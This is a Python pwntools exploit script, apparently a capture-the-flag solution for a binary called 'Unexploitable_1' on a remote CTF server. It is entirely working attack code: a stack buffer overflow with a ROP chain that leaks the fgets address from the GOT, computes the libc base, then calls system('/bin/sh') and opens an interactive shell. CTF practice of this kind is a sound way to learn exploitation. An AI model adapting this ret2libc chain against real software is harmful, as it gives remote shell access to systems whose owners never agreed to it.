#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./Unexploitable_1")
p = remote("ctf.j0n9hyun.xyz", 3023)
elf = ELF("./Unexploitable_1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
system_plt = elf.plt['system']
fgets_got = elf.got['fgets']
main = 0x4006dc
p1ret = 0x4007d3
one_gadget_off = 0x45216

pay = 'A'*(0x10 + 0x8)
pay += p64(p1ret) + p64(fgets_got) + p64(system_plt)
pay += p64(main)

p.sendlineafter("\n", pay)

#gdb.attach(p)
p.recvuntil("1: ")
fgets = u64(p.recv(6).ljust(8, '\x00'))
libcBase = fgets - libc.symbols['fgets']
system = libcBase + libc.symbols['system']
binsh = libcBase + list(libc.search("/bin/sh"))[0]
log.info("libcBase : "+hex(libcBase))
log.info("system : "+hex(system))
log.info("binsh: "+hex(binsh))

pay = 'A'*(0x10 + 0x8)
pay += p64(p1ret) + p64(binsh) + p64(system)

p.sendlineafter("\n", pay)

p.interactive()
